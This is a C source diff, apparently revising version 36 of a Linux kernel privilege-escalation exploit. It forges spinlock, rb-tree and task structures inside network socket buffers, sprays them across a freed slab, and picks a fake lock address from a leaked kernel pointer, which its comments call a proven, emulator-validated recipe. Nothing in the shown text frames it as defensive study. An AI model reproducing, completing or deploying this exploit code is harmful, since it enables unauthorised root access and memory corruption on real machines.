@@ -579,8 +579,13 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
     pi_top_task = SLIDE_INIT_TASK;
   }
 
-  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
+  /* v36: tile the v4 recipe every TILE bytes across the whole send buffer;
+     the skb data page lands somewhere unknown in the freed slab - tiling
+     guarantees SOME copy aligns. fake_lock picks copy #g_attempt_round. */
+  #define V4_TILE 0x1800  /* LOCK_OFF=0xE80 + FKT span 0x930 */
+  for (size_t chunk = 0; chunk + V4_TILE <= SKB_SEND_SIZE; chunk += V4_TILE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+    uintptr_t tile_base = base + chunk - (-SKB_DATA_DELTA);
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
@@ -596,9 +601,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       /* v4 PROVEN recipe (emulator-validated, STATE 11.28) */
       put64(p, LOCK_OFF + 0x00, 0xdead4ead00000000ULL); /* arch0+magic */
       put64(p, LOCK_OFF + 0x08, 0x00000000ffffffffULL); /* owner_cpu=-1 */
-      put64(p, LOCK_OFF + 0x18, payload_base + 0x400);        /* root=FW0 */
-      put64(p, LOCK_OFF + 0x20, payload_base + 0x600 + 0x18); /* leftmost=W2PI */
-      put64(p, LOCK_OFF + 0x28, payload_base + 0x800);        /* owner=FKT */
+      put64(p, LOCK_OFF + 0x18, tile_base + 0x400);
+      put64(p, LOCK_OFF + 0x20, tile_base + 0x600 + 0x18);
+      put64(p, LOCK_OFF + 0x28, tile_base + 0x800);
       /* FW0 @ +0x400: black root, prio 200 */
       put64(p, 0x400 + 0x00, 1);
       put64(p, 0x400 + 0x38, fake_lock);
@@ -810,6 +815,14 @@ uintptr_t prepare_kernel_page(int payload_mode, size_t cand_round) {
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   pr_info("[probe] base=%016zx payload_mode=%d entering skb payload", base, payload_mode);
+  /* v36: fake_lock = round-th tile (round persists across reboots) */
+  {
+    size_t n_tiles = (size_t)SKB_SEND_SIZE / 0x1800;
+    size_t k = g_attempt_round % n_tiles;
+    fake_lock = base + (k * 0x1800) - 0xe80 + LOCK_OFF;
+    pr_info("[p5] tile %zu/%zu fake_lock=%016zx
+", k, n_tiles, fake_lock);
+  }
   pr_info("[p5] prepare_skb_payload returned ok");
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
